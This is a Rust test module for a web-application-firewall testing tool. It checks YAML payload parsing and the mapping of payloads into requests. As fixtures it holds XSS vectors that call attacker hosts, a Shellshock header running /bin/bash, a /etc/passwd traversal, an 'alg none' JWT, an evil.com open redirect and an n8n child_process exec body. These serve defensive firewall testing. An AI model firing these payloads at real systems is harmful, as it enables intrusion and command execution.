    use super::*;

    #[test]
    fn sanitize_fixes_unknown_single_quote_escape() {
        let raw = r#"payload:
  - "\'-alert(1)//"
encoder:
  - URL
placeholder:
  - URLParam
type: XSS
"#;
        let fixed = sanitize_gotestwaf_yaml(raw);
        let doc: GoTestFile = serde_yaml::from_str(&fixed).expect("yaml should parse");
        assert_eq!(doc.payload, vec![r"\'-alert(1)//"]);
    }

    #[test]
    fn sanitize_keeps_valid_escapes() {
        let raw = r#"payload:
  - "a\nb\"c"
type: XSS
"#;
        let fixed = sanitize_gotestwaf_yaml(raw);
        let doc: GoTestFile = serde_yaml::from_str(&fixed).expect("yaml should parse");
        assert_eq!(doc.payload, vec!["a\nb\"c"]);
    }

    #[test]
    fn sanitize_ignores_plain_scalar_with_quote() {
        let raw = r#"payload:
  - \"autofocus onfocus=alert(1)//
  - "\'-alert(1)//"
type: XSS
"#;
        let fixed = sanitize_gotestwaf_yaml(raw);
        let doc: GoTestFile = serde_yaml::from_str(&fixed).expect("yaml should parse");
        assert_eq!(
            doc.payload,
            vec![r#"\"autofocus onfocus=alert(1)//"#, r"\'-alert(1)//"]
        );
    }

    #[test]
    fn sanitize_parses_upstream_xss_scripting_snippet() {
        let raw = r#"payload:
  - \"autof<x>ocus o<x>nfocus=alert<x>(1)//
  - '"><p only=1337 onmouseenter=window.location.href=//attacker.site>'
  - '"><svg onmouseover="confirm&#0000000040document.domain)'
  - "<<scr\0ipt/src=http://xss.com/xss.js></script"
  - "\'-alert(1)//"
encoder:
  - Base64Flat
  - URL
placeholder:
  - URLPath
  - URLParam
type: XSS
"#;
        let fixed = sanitize_gotestwaf_yaml(raw);
        let doc: GoTestFile =
            serde_yaml::from_str(&fixed).expect("xss-scripting snippet should parse");
        assert_eq!(doc.payload.len(), 5);
        assert_eq!(doc.payload[4], r"\'-alert(1)//");
    }

    #[test]
    fn waftester_path_payload_goes_to_uri() {
        let req = waftester_payload_to_request("../../../etc/passwd");
        assert!(req.uri.contains("etc/passwd"), "uri={}", req.uri);
        assert!(req.query.is_empty(), "query should be empty");
    }

    #[test]
    fn waftester_ua_header_line_goes_to_header() {
        let req = waftester_payload_to_request("User-Agent: () { :;}; /bin/bash -c id");
        assert_eq!(
            req.headers
                .get("User-Agent")
                .map(|s| s.as_str())
                .unwrap_or(""),
            "() { :;}; /bin/bash -c id"
        );
        assert!(req.query.is_empty());
    }

    #[test]
    fn waftester_jwt_goes_to_authorization() {
        let tok = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.";
        let req = waftester_payload_to_request(tok);
        assert!(
            req.query.contains("access_token=") && req.query.contains("eyJ"),
            "query={}",
            req.query
        );
        assert!(
            !req.headers.keys().any(|k| k.eq_ignore_ascii_case("authorization")),
            "authorization should be omitted to avoid regex budget exhaustion"
        );
    }

    #[test]
    fn waftester_app_path_goes_to_uri() {
        let req = waftester_payload_to_request(
            "/application/o/authorize/?client_id=test&redirect_uri=https://evil.com/callback",
        );
        assert_eq!(req.uri, "/application/o/authorize/");
        assert!(req.query.contains("redirect_uri=https://evil.com"));
    }

    #[test]
    fn waftester_graphql_json_goes_to_body() {
        let req = waftester_payload_to_request(r#"{"query": "{ __schema { types { name } } }"}"#);
        assert!(req.body.contains("__schema"), "body={}", req.body);
        assert!(req.query.is_empty());
        assert_eq!(req.uri, "/graphql");
    }

    #[test]
    fn waftester_http2_pseudo_block_parsed_to_headers() {
        let req = waftester_payload_to_request(
            ":method GET\r\n:path /\r\n:authority example.com\r\n:scheme https\r\n:method POST",
        );
        assert_eq!(req.headers.get(":method").map(String::as_str), Some("POST"));
        assert_eq!(req.headers.get(":path").map(String::as_str), Some("/"));
        assert_eq!(req.uri, "/");
    }

    #[test]
    fn waftester_proto_relative_stays_in_query() {
        let req = waftester_payload_to_request("//attacker.com");
        assert!(req.query.contains("attacker.com") || req.uri.contains("attacker"));
        assert!(!req.uri.starts_with("//"), "uri={}", req.uri);
    }

    #[test]
    fn waftester_item_body_goes_to_body() {
        let it = WafTesterItem {
            id: "n1".into(),
            payload: "/rest/workflows".into(),
            expected_block: Some(true),
            category: "services".into(),
            notes: "n8n".into(),
            tags: vec![],
            method: "POST".into(),
            body: r#"{"nodes":[{"type":"n8n-nodes-base.code","parameters":{"jsCode":"require('child_process').exec('id')"}}]}"#.into(),
            endpoint: String::new(),
            headers: HashMap::new(),
            repeat: None,
        };
        let req = waftester_item_to_request(&it);
        assert_eq!(req.uri, "/rest/workflows");
        assert_eq!(req.method, "POST");
        assert!(req.body.contains("child_process"), "body={}", req.body);
        assert!(req.query.is_empty());
    }
}
